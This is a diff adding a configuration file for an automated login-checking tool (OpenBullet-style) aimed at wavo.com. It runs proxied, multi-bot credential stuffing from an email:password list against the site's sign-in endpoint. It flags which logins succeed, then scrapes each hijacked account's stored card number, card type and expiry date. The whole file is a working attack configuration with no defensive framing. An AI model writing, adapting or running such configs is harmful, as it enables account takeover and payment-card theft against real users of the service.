@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "wavo",
+  "SuggestedBots": 80,
+  "LastModified": "2019-06-13T04:36:28.1677918+01:00",
+  "AdditionalInfo": "",
+  "Author": "malo",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.wavo.com/secure/authenticate" 
+  CONTENT "username=<USER>&password=<PASS>&cookielink=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.wavo.com" 
+  HEADER "Referer: https://www.wavo.com/secure/signin?parent=https%3A%2F%2Fwww.wavo.com%2Fpackages" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "loginnotfound" 
+  KEYCHAIN Success OR 
+    KEY "loginsuccess" 
+REQUEST GET "https://www.wavo.com/account/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<span id=\"iptvaccount_review_cardnumber\">" "<" -> CAP "Card Number" 
+PARSE "<SOURCE>" LR "<span id=\"iptvaccount_review_cardtype\">" "<" -> CAP "type" 
+PARSE "<SOURCE>" LR "<div id=\"iptvaccount_review_cardexp\" class=\"profile\">" "<" -> CAP "Expiry Date" 
